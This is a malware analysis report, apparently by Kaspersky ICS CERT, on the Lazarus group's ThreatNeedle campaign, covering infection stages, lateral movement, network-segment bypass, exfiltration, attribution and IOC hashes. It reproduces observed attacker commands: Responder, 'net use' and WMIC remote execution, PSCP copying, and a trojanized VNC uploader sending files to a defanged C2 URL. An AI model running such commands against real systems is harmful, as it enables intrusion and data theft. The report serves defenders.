+<p>Upon opening a malicious document and allowing the macro, the malware is dropped and proceeds to a multistage deployment procedure. The malware used in this campaign belongs to a known malware cluster we named ThreatNeedle. We attribute this malware family to the advanced version of Manuscrypt (a.k.a. NukeSped), a family belonging to the Lazarus group. We previously observed the Lazarus group utilizing this cluster when attacking cryptocurrency businesses and a mobile game company. Although the malware involved and the entire infection process is known and has not changed dramatically compared to previous findings, the Lazarus group continued using ThreatNeedle malware aggressively in this campaign.</p>
+
+
+
+<figure class="wp-block-image size-full"><a class="light-box" href="https://ics-cert.kaspersky.com/wp-content/uploads/sites/6/2021/02/210225-lazarus-threatneedle-07.png"><img loading="lazy" width="1504" height="514" src="https://ics-cert.kaspersky.com/wp-content/uploads/sites/6/2021/02/210225-lazarus-threatneedle-07.png" alt="" class="wp-image-3678" srcset="https://ics-cert.kaspersky.com/wp-content/uploads/sites/6/2021/02/210225-lazarus-threatneedle-07.png 1504w, https://ics-cert.kaspersky.com/wp-content/uploads/sites/6/2021/02/210225-lazarus-threatneedle-07-300x103.png 300w, https://ics-cert.kaspersky.com/wp-content/uploads/sites/6/2021/02/210225-lazarus-threatneedle-07-1024x350.png 1024w, https://ics-cert.kaspersky.com/wp-content/uploads/sites/6/2021/02/210225-lazarus-threatneedle-07-768x262.png 768w" sizes="(max-width: 1504px) 100vw, 1504px" /></a><figcaption><em>Infection procedure</em></figcaption></figure>
+
+
+
+<p>The payload created by the initial spear-phishing document loads the next stage as a backdoor running in-memory – the ThreatNeedle backdoor. ThreatNeedle offers functionality to control infected victims. The actor uses it to carry out initial reconnaissance and deploy additional malware for lateral movement. When moving laterally, the actor uses ThreatNeedle installer-type malware in the process. This installer is responsible for implanting the next stage loader-type malware and registering it for auto-execution in order to achieve persistence. The ThreatNeedle loader-type malware exists in several variations and serves the primary purpose of loading the final stage of the ThreatNeedle malware in-memory.&nbsp;</p>
+
+
+
+<h3 id="_Toc64638318">ThreatNeedle installer</h3>
+
+
+
+<p>Upon launch, the malware decrypts an embedded string using RC4 (key: <code data-enlighter-language="raw" class="EnlighterJSRAW">B6 B7 2D 8C 6B 5F 14 DF B1 38 A1 73 89 C1 D2 C4</code>) and compares it to <em><code data-enlighter-language="raw" class="EnlighterJSRAW">7486513879852</code></em>. If the user executes this malware without a command line parameter, the malware launches a legitimate calculator carrying a dark icon of the popular Avengers franchise.</p>
+
+
+
+<p>Further into the infection process, the malware chooses a service name randomly from netsvc in order to use it for the payload creation path. The malware then creates a file named <code data-enlighter-language="raw" class="EnlighterJSRAW">bcdbootinfo.tlp</code> in the system folder containing the infection time and the random service name that is chosen. We’ve discovered that the malware operator checks this file to see whether the remote host was infected and, if so, when the infection happened.</p>
+
+
+
+<p>It then decrypts the embedded payload using the RC4 algorithm, saves it to an .xml extension with a randomly created five-character file name in the current directory and then copies it to the system folder with a .sys extension.</p>
+
+
+
+<p>This final payload is the ThreatNeedle loader running in memory.&nbsp;At this point the loader uses a different RC4 key (<code data-enlighter-language="raw" class="EnlighterJSRAW">3D 68 D0 0A B1 0E C6 AF DD EE 18 8E F4 A1 D6 20</code>), and the dropped malware is registered as a Windows service and launched.&nbsp;In addition, the malware saves the configuration data as a registry key encrypted in RC4:</p>
+
+
+
+<pre class="EnlighterJSRAW" data-enlighter-language="raw" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="false" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\GameConfig - Description</pre>
+
+
+
+<h3 id="_Toc64638319">ThreatNeedle loader</h3>
+
+
+
+<p>This component is responsible for loading the final backdoor payload into memory. In order to do this, the malware uses several techniques to decrypt its payload:</p>
+
+
+
+<ul><li>Loading the payload from the registry.</li><li>Loading the payload from itself after decrypting RC4 and decompression.</li><li>Loading the payload from itself after decrypting AES and decompression.</li><li>Loading the payload from itself after decompression.</li><li>Loading the payload from itself after one-byte XORing.</li></ul>
+
+
+
+<p>Most loader-style malware types check the command line parameter and only proceed with the malicious routine if an expected parameter is given. This is a common trait in ThreatNeedle loaders. The most common example we’ve seen is similar to the ThreatNeedle installer – the malware decrypts an embedded string using RC4, and compares it with the parameter <code data-enlighter-language="raw" class="EnlighterJSRAW">Sx6BrUk4v4rqBFBV</code> upon launch. If it matches, the malware begins decrypting its embedded payload using the same RC4 key. The decrypted payload is an archive file which is subsequently decompressed in the process. Eventually, the ThreatNeedle malware spawns in memory.</p>
+
+
+
+<p>The other variant of the loader is preparing the next stage payload from the victim&#8217;s registry. As we can see from the installer malware description, we suspect that the registry key was created by the installer component. Retrieved data from the registry is decrypted using RC4 and then decompressed. Eventually, it gets loaded into memory and the export function is invoked.</p>
+
+
+
+<h3 id="_Toc64638320">ThreatNeedle backdoor</h3>
+
+
+
+<p>The final payload executed in memory is the actual ThreatNeedle backdoor. It has the following functionality to control infected victim machines:</p>
+
+
+
+<ul><li>Manipulate files/directories</li><li>System profiling</li><li>Control backdoor processes</li><li>Enter sleeping or hibernation mode</li><li>Update backdoor configuration</li><li>Execute received commands</li></ul>
+
+
+
+<h2 id="_Toc64638321">Post-exploitation phase</h2>
+
+
+
+<p>From one of the hosts, we discovered that the actor executed a credential harvesting tool named <a href="https://github.com/lgandx/Responder/">Responder</a> and moved laterally using Windows commands. Lazarus overcame network segmentation, exfiltrating data from a completely isolated network segment cut off from the internet by compromising a router virtual machine, as we explain below under <em>“Overcoming network segmentation</em>”.</p>
+
+
+
+<p>Judging by the hosts that were infected with the ThreatNeedle backdoors post-exploitation, we speculate that the primary intention of this attack is to steal intellectual property. Lastly, the stolen data gets exfiltrated using a custom tool that will be described in the “<em>Exfiltration”</em> section. Below is a rough timeline of the compromise we investigated:</p>
+
+
+
+<figure class="wp-block-image size-full"><a class="light-box" href="https://ics-cert.kaspersky.com/wp-content/uploads/sites/6/2021/02/210225-lazarus-threatneedle-08.png"><img loading="lazy" width="1600" height="856" src="https://ics-cert.kaspersky.com/wp-content/uploads/sites/6/2021/02/210225-lazarus-threatneedle-08.png" alt="" class="wp-image-3690" srcset="https://ics-cert.kaspersky.com/wp-content/uploads/sites/6/2021/02/210225-lazarus-threatneedle-08.png 1600w, https://ics-cert.kaspersky.com/wp-content/uploads/sites/6/2021/02/210225-lazarus-threatneedle-08-300x161.png 300w, https://ics-cert.kaspersky.com/wp-content/uploads/sites/6/2021/02/210225-lazarus-threatneedle-08-1024x548.png 1024w, https://ics-cert.kaspersky.com/wp-content/uploads/sites/6/2021/02/210225-lazarus-threatneedle-08-768x411.png 768w, https://ics-cert.kaspersky.com/wp-content/uploads/sites/6/2021/02/210225-lazarus-threatneedle-08-1536x822.png 1536w" sizes="(max-width: 1600px) 100vw, 1600px" /></a><figcaption><em>Timeline of infected hosts</em></figcaption></figure>
+
+
+
+<h3 id="_Toc64638322">Credential gathering</h3>
+
+
+
+<p>During the investigation we discovered that the Responder tool was executed from one of the victim machines that had received the spear-phishing document. One day after the initial infection, the malware operator placed the tool onto this host and executed it using the following command:</p>
+
+
+
+<pre class="EnlighterJSRAW" data-enlighter-language="raw" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="false" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">[Responder file path] -i [IP address] -rPv</pre>
+
+
+
+<p>Several days later, the attacker started to move laterally originating from this host. Therefore, we assess that the attacker succeeded in acquiring login credentials from this host and started using them for further malicious activity.&nbsp;</p>
+
+
+
+<h3 id="_Toc64638323">Lateral movement</h3>
+
+
+
+<p>After acquiring the login credentials, the actor started to move laterally from workstations to server hosts. Typical lateral movement methods were employed, using Windows commands. First, a network connection with a remote host was established using the command <code data-enlighter-language="raw" class="EnlighterJSRAW">net use</code>.</p>
+
+
+
+<pre class="EnlighterJSRAW" data-enlighter-language="raw" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="false" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">net use \\[IP address]\IPC$ "[password]" /u:"[user name]" > $temp\~tmp5936t.tmp 2>&amp;1"</pre>
+
+
+
+<p>Next, the actor copied malware to the remote host using the Windows Management Instrumentation Command-line (WMIC).</p>
+
+
+
+<pre class="EnlighterJSRAW" data-enlighter-language="raw" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="false" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">wmic.exe /node:[IP address] /user:"[user name]" /password:"[password]" PROCESS CALL CREATE "cmd.exe /c $appdata\Adobe\adobe.bat"</pre>
+
+
+
+<pre class="EnlighterJSRAW" data-enlighter-language="raw" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="false" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">wmic.exe /node:[IP address] /user:"[user name]" /password:"[password]" PROCESS CALL CREATE "cmd /c sc queryex helpsvc > $temp\tmp001.dat"</pre>
+
+
+
+<h3 id="_Toc64638324">Overcoming network segmentation</h3>
+
+
+
+<p>In the course of this research, we identified another highly interesting technique used by the attackers for lateral movement and exfiltration of stolen data. The enterprise network under attack was divided into two segments: corporate (a network on which computers had internet access) and restricted (a network on which computers hosted sensitive data and had no internet access). According to corporate policies, no transfer of information was allowed between these two segments. In other words, the two segments were meant to be completely separated.</p>
+
+
+
+<p>Initially, the attackers were able to get access to systems with internet access and spent a long time distributing malware between machines in the network’s corporate segment. Among the compromised machines were those used by the administrators of the enterprise’s IT infrastructure.</p>
+
+
+
+<p>It is worth noting that the administrators could connect both to the corporate and the restricted network segments to maintain systems and provide users with technical support in both zones. As a result, by gaining control of administrator workstations the attackers were able to access the restricted network segment.</p>
+
+
+
+<p>However, since directly routing traffic between the segments was not possible, the attackers couldn’t use their standard malware set to exfiltrate data from the restricted segment to the C2.</p>
+
+
+
+<p>The situation changed on July 2 when the attackers managed to obtain the credentials for the router used by the administrators to connect to systems in both segments. The router was a virtual machine running CentOS to route traffic between several network interfaces based on predefined rules.</p>
+
+
+
+<div class="wp-block-image"><figure class="aligncenter size-full"><a class="light-box" href="https://ics-cert.kaspersky.com/wp-content/uploads/sites/6/2021/02/210225-lazarus-threatneedle-09.png"><img loading="lazy" width="1270" height="504" src="https://ics-cert.kaspersky.com/wp-content/uploads/sites/6/2021/02/210225-lazarus-threatneedle-09.png" alt="" class="wp-image-3787" srcset="https://ics-cert.kaspersky.com/wp-content/uploads/sites/6/2021/02/210225-lazarus-threatneedle-09.png 1270w, https://ics-cert.kaspersky.com/wp-content/uploads/sites/6/2021/02/210225-lazarus-threatneedle-09-300x119.png 300w, https://ics-cert.kaspersky.com/wp-content/uploads/sites/6/2021/02/210225-lazarus-threatneedle-09-1024x406.png 1024w, https://ics-cert.kaspersky.com/wp-content/uploads/sites/6/2021/02/210225-lazarus-threatneedle-09-768x305.png 768w" sizes="(max-width: 1270px) 100vw, 1270px" /></a><figcaption><em>Connection layout between victim’s network segments</em></figcaption></figure></div>
+
+
+
+<p>According to the evidence collected, the attackers scanned the router’s ports and detected a <a href="https://www.webmin.com/">Webmin</a> interface. Next, the attackers logged in to the web interface using a privileged root account. It’s unknown how the attackers were able to obtain the credentials for that account, but it’s possible the credentials were saved in one of the infected system’s browser password managers.</p>
+
+
+
+<figure class="wp-block-image size-full"><a class="light-box" href="https://ics-cert.kaspersky.com/wp-content/uploads/sites/6/2021/02/210225-lazarus-threatneedle-10.png"><img loading="lazy" width="1404" height="245" src="https://ics-cert.kaspersky.com/wp-content/uploads/sites/6/2021/02/210225-lazarus-threatneedle-10.png" alt="" class="wp-image-3699" srcset="https://ics-cert.kaspersky.com/wp-content/uploads/sites/6/2021/02/210225-lazarus-threatneedle-10.png 1404w, https://ics-cert.kaspersky.com/wp-content/uploads/sites/6/2021/02/210225-lazarus-threatneedle-10-300x52.png 300w, https://ics-cert.kaspersky.com/wp-content/uploads/sites/6/2021/02/210225-lazarus-threatneedle-10-1024x179.png 1024w, https://ics-cert.kaspersky.com/wp-content/uploads/sites/6/2021/02/210225-lazarus-threatneedle-10-768x134.png 768w" sizes="(max-width: 1404px) 100vw, 1404px" /></a><figcaption><em>Log listing Webmin web interface logins</em></figcaption></figure>
+
+
+
+<p>By gaining access to the configuration panel the attackers configured the Apache web server and started using the router as a proxy server between the organization’s corporate and restricted segments.</p>
+
+
+
+<figure class="wp-block-image size-full"><a class="light-box" href="https://ics-cert.kaspersky.com/wp-content/uploads/sites/6/2021/02/210225-lazarus-threatneedle-11.png"><img loading="lazy" width="868" height="260" src="https://ics-cert.kaspersky.com/wp-content/uploads/sites/6/2021/02/210225-lazarus-threatneedle-11.png" alt="" class="wp-image-3701" srcset="https://ics-cert.kaspersky.com/wp-content/uploads/sites/6/2021/02/210225-lazarus-threatneedle-11.png 868w, https://ics-cert.kaspersky.com/wp-content/uploads/sites/6/2021/02/210225-lazarus-threatneedle-11-300x90.png 300w, https://ics-cert.kaspersky.com/wp-content/uploads/sites/6/2021/02/210225-lazarus-threatneedle-11-768x230.png 768w" sizes="(max-width: 868px) 100vw, 868px" /></a><figcaption><em>List of services used on the router</em></figcaption></figure>
+
+
+
+<p>Several days after that, on July 10, 2020, the attackers connected to the router via SSH and set up the PuTTy <a href="https://www.ssh.com/ssh/putty/putty-manuals/0.68/Chapter5.html">PSCP</a><strong> </strong>(the PuTTY Secure Copy client) utility on one of the infected machines. This utility was used to upload malware to the router VM. This enabled the attackers to place malware onto systems in the restricted segment of the enterprise network, using the router to host the samples. In addition, malware running in the network’s restricted segment was able to exfiltrate the collected data to the command-and-control server via the Apache server set up on the same router.</p>
+
+
+
+<div class="wp-block-image"><figure class="aligncenter size-full"><a class="light-box" href="https://ics-cert.kaspersky.com/wp-content/uploads/sites/6/2021/02/210225-lazarus-threatneedle-12.png"><img loading="lazy" width="1289" height="558" src="https://ics-cert.kaspersky.com/wp-content/uploads/sites/6/2021/02/210225-lazarus-threatneedle-12.png" alt="" class="wp-image-3789" srcset="https://ics-cert.kaspersky.com/wp-content/uploads/sites/6/2021/02/210225-lazarus-threatneedle-12.png 1289w, https://ics-cert.kaspersky.com/wp-content/uploads/sites/6/2021/02/210225-lazarus-threatneedle-12-300x130.png 300w, https://ics-cert.kaspersky.com/wp-content/uploads/sites/6/2021/02/210225-lazarus-threatneedle-12-1024x443.png 1024w, https://ics-cert.kaspersky.com/wp-content/uploads/sites/6/2021/02/210225-lazarus-threatneedle-12-768x332.png 768w" sizes="(max-width: 1289px) 100vw, 1289px" /></a><figcaption><em>New connection layout after attacker’s intrusion</em></figcaption></figure></div>
+
+
+
+<p>In the course of the investigation we identified malware samples with the hardcoded URL of the router used as a proxy server.</p>
+
+
+
+<figure class="wp-block-image size-full"><a class="light-box" href="https://ics-cert.kaspersky.com/wp-content/uploads/sites/6/2021/02/210225-lazarus-threatneedle-13.png"><img loading="lazy" width="1031" height="87" src="https://ics-cert.kaspersky.com/wp-content/uploads/sites/6/2021/02/210225-lazarus-threatneedle-13.png" alt="" class="wp-image-3705" srcset="https://ics-cert.kaspersky.com/wp-content/uploads/sites/6/2021/02/210225-lazarus-threatneedle-13.png 1031w, https://ics-cert.kaspersky.com/wp-content/uploads/sites/6/2021/02/210225-lazarus-threatneedle-13-300x25.png 300w, https://ics-cert.kaspersky.com/wp-content/uploads/sites/6/2021/02/210225-lazarus-threatneedle-13-1024x86.png 1024w, https://ics-cert.kaspersky.com/wp-content/uploads/sites/6/2021/02/210225-lazarus-threatneedle-13-768x65.png 768w" sizes="(max-width: 1031px) 100vw, 1031px" /></a><figcaption><em>Hardcoded proxy address in the malware</em></figcaption></figure>
+
+
+
+<p>Since the attackers regularly deleted log files from the router, only a handful of commands entered to the command line via SSH could be recovered. An analysis of these commands shows that the attackers tried to reconfigure traffic routing using the route command.</p>
+
+
+
+<figure class="wp-block-image size-full is-resized"><a class="light-box" href="https://ics-cert.kaspersky.com/wp-content/uploads/sites/6/2021/02/210225-lazarus-threatneedle-14.png"><img loading="lazy" src="https://ics-cert.kaspersky.com/wp-content/uploads/sites/6/2021/02/210225-lazarus-threatneedle-14.png" alt="" class="wp-image-3707" width="250" height="78" srcset="https://ics-cert.kaspersky.com/wp-content/uploads/sites/6/2021/02/210225-lazarus-threatneedle-14.png 499w, https://ics-cert.kaspersky.com/wp-content/uploads/sites/6/2021/02/210225-lazarus-threatneedle-14-300x94.png 300w" sizes="(max-width: 250px) 100vw, 250px" /></a><figcaption><em>Attacker commands</em></figcaption></figure>
+
+
+
+<p>The attackers also ran the nmap utility on the router VM and scanned ports on systems within the restricted segment of the enterprise network. On September 27, the attackers started removing all traces of their activity from the router, using the logrotate utility to set up automatic deletion of log files.</p>
+
+
+
+<figure class="wp-block-image size-full"><a class="light-box" href="https://ics-cert.kaspersky.com/wp-content/uploads/sites/6/2021/02/210225-lazarus-threatneedle-15.png"><img loading="lazy" width="918" height="99" src="https://ics-cert.kaspersky.com/wp-content/uploads/sites/6/2021/02/210225-lazarus-threatneedle-15.png" alt="" class="wp-image-3711" srcset="https://ics-cert.kaspersky.com/wp-content/uploads/sites/6/2021/02/210225-lazarus-threatneedle-15.png 918w, https://ics-cert.kaspersky.com/wp-content/uploads/sites/6/2021/02/210225-lazarus-threatneedle-15-300x32.png 300w, https://ics-cert.kaspersky.com/wp-content/uploads/sites/6/2021/02/210225-lazarus-threatneedle-15-768x83.png 768w" sizes="(max-width: 918px) 100vw, 918px" /></a><figcaption><em>Webmin log</em></figcaption></figure>
+
+
+
+<h3 id="_Toc64638325">Exfiltration</h3>
+
+
+
+<p>We observed that the malware operator attempted to create SSH tunnels to a remote server located in South Korea from several compromised server hosts. They used a custom tunneling tool to achieve this. The tool receives four parameters: client IP address, client port, server IP address and server port. The tool offers basic functionality, forwarding client traffic to the server. In order to create a covert channel, the malware encrypts forwarded traffic using trivial binary encryption.</p>
+
+
+
+<figure class="wp-block-image size-full"><a class="light-box" href="https://ics-cert.kaspersky.com/wp-content/uploads/sites/6/2021/02/210225-lazarus-threatneedle-16.png"><img loading="lazy" width="920" height="316" src="https://ics-cert.kaspersky.com/wp-content/uploads/sites/6/2021/02/210225-lazarus-threatneedle-16.png" alt="" class="wp-image-3715" srcset="https://ics-cert.kaspersky.com/wp-content/uploads/sites/6/2021/02/210225-lazarus-threatneedle-16.png 920w, https://ics-cert.kaspersky.com/wp-content/uploads/sites/6/2021/02/210225-lazarus-threatneedle-16-300x103.png 300w, https://ics-cert.kaspersky.com/wp-content/uploads/sites/6/2021/02/210225-lazarus-threatneedle-16-768x264.png 768w" sizes="(max-width: 920px) 100vw, 920px" /></a><figcaption><em>Encryption routine</em></figcaption></figure>
+
+
+
+<p>Using the covert channel, the adversary copied data from the remote server over to the host using the PuTTy PSCP tool:</p>
+
+
+
+<pre class="EnlighterJSRAW" data-enlighter-language="raw" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="false" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">%APPDATA%\PBL\unpack.tmp  -pw [password] root@[IP address]:/tmp/cab0215 %APPDATA%\PBL\cab0215.tmp</pre>
+
+
+
+<p>After copying data from the server, the actor utilized the custom tool to exfiltrate stolen data to the remote server. This malware looks like a legitimate VNC client and runs like one if it’s executed without any command line parameters.&nbsp;</p>
+
+
+
+<figure class="wp-block-image size-full"><a class="light-box" href="https://ics-cert.kaspersky.com/wp-content/uploads/sites/6/2021/02/210225-lazarus-threatneedle-17.png"><img loading="lazy" width="924" height="664" src="https://ics-cert.kaspersky.com/wp-content/uploads/sites/6/2021/02/210225-lazarus-threatneedle-17.png" alt="" class="wp-image-3718" srcset="https://ics-cert.kaspersky.com/wp-content/uploads/sites/6/2021/02/210225-lazarus-threatneedle-17.png 924w, https://ics-cert.kaspersky.com/wp-content/uploads/sites/6/2021/02/210225-lazarus-threatneedle-17-300x216.png 300w, https://ics-cert.kaspersky.com/wp-content/uploads/sites/6/2021/02/210225-lazarus-threatneedle-17-768x552.png 768w" sizes="(max-width: 924px) 100vw, 924px" /></a><figcaption><em>Execution of malware without parameters</em></figcaption></figure>
+
+
+
+<p>However, if this application is executed with specific command line parameters, it runs an alternate, malicious function. According to our telemetry, the actor executed this application with six parameters:</p>
+
+
+
+<pre class="EnlighterJSRAW" data-enlighter-language="raw" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="false" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">%APPDATA%\Comms\Comms.dat S0RMM-50QQE-F65DN-DCPYN-5QEQA  hxxps://www.gonnelli[.]it/uploads/catalogo/thumbs/thumb[.]asp %APPDATA%\Comms\cab59.tmp FL0509 15000</pre>
+
+
+
+<p>Also, if the number of command line parameters is greater than six, the malware jumps into a malicious routine. The malware also checks the length of the second argument – if it’s less than 29 characters, it terminates the execution. When the parameter checking procedure has passed successfully, the malware starts to decrypt its next payload.&nbsp;</p>
+
+
+
+<p>The embedded payload gets decrypted via XOR, where each byte from the end of the payload gets applied to the preceding byte. Next, the XORed blob receives the second command line argument that’s provided (in this case <code data-enlighter-language="raw" class="EnlighterJSRAW">S0RMM-50QQE-F65DN-DCPYN-5QEQA</code>). The malware can accept more command line arguments, and depending on its number it runs differently. For example, it can also receive proxy server addresses with the <code data-enlighter-language="raw" class="EnlighterJSRAW">-p</code> option.</p>
+
+
+
+<p>When the decrypted in-memory payload is executed, it compares the header of the configuration data passed with the string <code data-enlighter-language="raw" class="EnlighterJSRAW">0x8406</code> in order to confirm its validity. The payload opens a given file (in this example <code data-enlighter-language="raw" class="EnlighterJSRAW">%APPDATA%\Comms\cab59.tmp</code>) and starts exfiltrating it to the remote server. When the malware uploads data to the C2 server, it uses HTTP POST requests with two parameters named <code data-enlighter-language="raw" class="EnlighterJSRAW">fr</code> and <code data-enlighter-language="raw" class="EnlighterJSRAW">fp</code>:</p>
+
+
+
+<ul><li>The <code data-enlighter-language="raw" class="EnlighterJSRAW">fr</code> parameter contains the file name from the command line argument to upload.</li><li>The <code data-enlighter-language="raw" class="EnlighterJSRAW">fp</code> parameter contains the base64 encoded size, CRC32 value of content and file contents.</li></ul>
+
+
+
+<figure class="wp-block-image size-full"><a class="light-box" href="https://ics-cert.kaspersky.com/wp-content/uploads/sites/6/2021/02/210225-lazarus-threatneedle-18.png"><img loading="lazy" width="1558" height="131" src="https://ics-cert.kaspersky.com/wp-content/uploads/sites/6/2021/02/210225-lazarus-threatneedle-18.png" alt="" class="wp-image-3723" srcset="https://ics-cert.kaspersky.com/wp-content/uploads/sites/6/2021/02/210225-lazarus-threatneedle-18.png 1558w, https://ics-cert.kaspersky.com/wp-content/uploads/sites/6/2021/02/210225-lazarus-threatneedle-18-300x25.png 300w, https://ics-cert.kaspersky.com/wp-content/uploads/sites/6/2021/02/210225-lazarus-threatneedle-18-1024x86.png 1024w, https://ics-cert.kaspersky.com/wp-content/uploads/sites/6/2021/02/210225-lazarus-threatneedle-18-768x65.png 768w, https://ics-cert.kaspersky.com/wp-content/uploads/sites/6/2021/02/210225-lazarus-threatneedle-18-1536x129.png 1536w" sizes="(max-width: 1558px) 100vw, 1558px" /></a><figcaption><em>Contents of fp parameter</em></figcaption></figure>
+
+
+
+<h2 id="_Toc64638326">Attribution</h2>
+
+
+
+<p>We have been tracking ThreatNeedle malware for more than two years and are highly confident that this malware cluster is attributed only to the Lazarus group. During this investigation, we were able to find connections to several clusters of the Lazarus group.</p>
+
+
+
+<figure class="wp-block-image size-full"><a class="light-box" href="https://ics-cert.kaspersky.com/wp-content/uploads/sites/6/2021/02/210225-lazarus-threatneedle-19.png"><img loading="lazy" width="1474" height="884" src="https://ics-cert.kaspersky.com/wp-content/uploads/sites/6/2021/02/210225-lazarus-threatneedle-19.png" alt="" class="wp-image-3726" srcset="https://ics-cert.kaspersky.com/wp-content/uploads/sites/6/2021/02/210225-lazarus-threatneedle-19.png 1474w, https://ics-cert.kaspersky.com/wp-content/uploads/sites/6/2021/02/210225-lazarus-threatneedle-19-300x180.png 300w, https://ics-cert.kaspersky.com/wp-content/uploads/sites/6/2021/02/210225-lazarus-threatneedle-19-1024x614.png 1024w, https://ics-cert.kaspersky.com/wp-content/uploads/sites/6/2021/02/210225-lazarus-threatneedle-19-768x461.png 768w" sizes="(max-width: 1474px) 100vw, 1474px" /></a><figcaption><em>Connections between Lazarus campaigns</em></figcaption></figure>
+
+
+
+<h3 id="_Toc64638327">Connection with DeathNote cluster</h3>
+
+
+
+<p>During this investigation we identified several connections with the DeathNote (a.k.a. <a href="https://www.clearskysec.com/operation-dream-job/">Operation Dream Job</a>) cluster of the Lazarus group. First of all, among the hosts infected by the ThreatNeedle malware, we discovered one that was also infected with the DeathNote malware, and both threats used the same C2 server URLs.</p>
+
+
+
+<p>In addition, while analyzing the C2 server used in this attack, we found a custom web shell script that was also discovered on the DeathNote C2 server. We also identified that the server script corresponding to the <em>Trojanized VNC Uploader</em> was found on the DeathNote C2 server.</p>
+
+
+
+<p>Although DeathNote and this incident show different TTPs, both campaigns share command and control infrastructure and some victimology.</p>
+
+
+
+<h3 id="_Toc64638328">Connection with Operation AppleJeus</h3>
+
+
+
+<p>We also found a connection with <a href="https://securelist.com/operation-applejeus/87553/">Operation AppleJeus</a>. As we described, the actor used a homemade tunneling tool in the ThreatNeedle campaign that has a custom encryption routine to create a covert channel. This very same tool was utilized in operation AppleJeus as well.</p>
+
+
+
+<figure class="wp-block-image size-full"><a class="light-box" href="https://ics-cert.kaspersky.com/wp-content/uploads/sites/6/2021/02/210225-lazarus-threatneedle-20.png"><img loading="lazy" width="1774" height="348" src="https://ics-cert.kaspersky.com/wp-content/uploads/sites/6/2021/02/210225-lazarus-threatneedle-20.png" alt="" class="wp-image-3729" srcset="https://ics-cert.kaspersky.com/wp-content/uploads/sites/6/2021/02/210225-lazarus-threatneedle-20.png 1774w, https://ics-cert.kaspersky.com/wp-content/uploads/sites/6/2021/02/210225-lazarus-threatneedle-20-300x59.png 300w, https://ics-cert.kaspersky.com/wp-content/uploads/sites/6/2021/02/210225-lazarus-threatneedle-20-1024x201.png 1024w, https://ics-cert.kaspersky.com/wp-content/uploads/sites/6/2021/02/210225-lazarus-threatneedle-20-768x151.png 768w, https://ics-cert.kaspersky.com/wp-content/uploads/sites/6/2021/02/210225-lazarus-threatneedle-20-1536x301.png 1536w" sizes="(max-width: 1774px) 100vw, 1774px" /></a><figcaption><em>Same tunneling tool</em></figcaption></figure>
+
+
+
+<h3 id="_Toc64638329">Connection with Bookcode cluster</h3>
+
+
+
+<p>In our previous <a href="https://securelist.com/lazarus-covets-covid-19-related-intelligence/99906/">blog</a> about Lazarus group, we mentioned the Bookcode cluster attributed to Lazarus group; and recently the Korea Internet and Security Agency (KISA) also <a href="https://www.krcert.or.kr/data/reportView.do?bulletin_writing_sequence=35471">published</a> a report about the operation. In the report, they mentioned a malware cluster named LPEClient used for profiling hosts and fetching next stage payloads. While investigating this incident, we also found LPEClient from the host infected with ThreatNeedle. So, we assess that the ThreatNeedle cluster is connected to the Bookcode operation.</p>
+
+
+
+<h2 id="_Toc64638330">Conclusions</h2>
+
+
+
+<p>In recent years, the Lazarus group has focused on attacking financial institutions around the world. However, beginning in early 2020, they focused on aggressively attacking the defense industry. While Lazarus has also previously utilized the ThreatNeedle malware used in this attack when targeting cryptocurrency businesses, it is currently being actively used in cyberespionage attacks.&nbsp;</p>
+
+
+
+<p>This investigation allowed us to create strong ties between multiple campaigns that Lazarus has conducted, reinforcing our attribution. In this campaign the Lazarus group demonstrated its sophistication level and ability to circumvent the security measures they face during their attacks, such as network segmentation. We assess that Lazarus is a highly prolific group, conducting several campaigns using different strategies. They shared tools and infrastructure among these campaigns to accomplish their goals.&nbsp;</p>
+
+
+
+<p><em>Kaspersky ICS CERT would like to thank Vasily Berdnikov (Kaspersky targeted attacks research group) for his help.</em></p>
+
+
+
+<h2 id="_Toc64638331">Appendix I – Indicators of Compromise</h2>
+
+
+
+<p><strong>Malicious documents</strong></p>
+
+
+
+<pre class="EnlighterJSRAW" data-enlighter-language="raw" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">e7aa0237fc3db67a96ebd877806a2c88    Boeing_AERO_GS.docx</pre>
+
+
+
+<p><strong>Installer</strong></p>
+
+
+
+<pre class="EnlighterJSRAW" data-enlighter-language="raw" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">b191cc4d73a247afe0a62a8c38dc9137    %APPDATA%\Microsoft\DRM\logon.bin
+9e440e231ef2c62c78147169a26a1bd3    C:\ProgramData\ntnser.bin
+b7cc295767c1d8c6c68b1bb6c4b4214f    C:\ProgramData\ntnser.bin
+0f967343e50500494cf3481ce4de698c    C:\ProgramData\Microsoft\MSDN\msdn.bin
+09aa1427f26e7dd48955f09a9c604564    %APPDATA\Microsoft\info.dat
+07b22533d08f32d48485a521dbc1974d    C:\ProgramData\adobe\load.dat
+1c5e4d60a1041cf2903817a31c1fa212    C:\ProgramData\Adobe\adobe.tmp
+4cebc83229a40c25434c51ee3d6be13e    C:\ProgramData\Adobe\up.tmp
+23b04b18c75aa7d286fea5d28d41a830    %APPDATA%\Microsoft\DRM\logon.dat
+319ace20f6ffd39b7fff1444f73c9f5d    %APPDATA%\Microsoft\DRM\logon.bin
+45c0a6e13cad26c69eff59fded88ef36    %APPDATA%\Microsoft\DRM\logon.dat
+486f25db5ca980ef4a7f6dfbf9e2a1ad    C:\ProgramData\ntusers.dat
+1333967486d3ab50d768fb745dae9af5    C:\PerfLogs\log.bin
+07b22533d08f32d48485a521dbc1974d    C:\ProgramData\Adobe\load.dat
+c86d0a2fa9c4ef59aa09e2435b4ab70c    %TEMP%\ETS4659.tmp
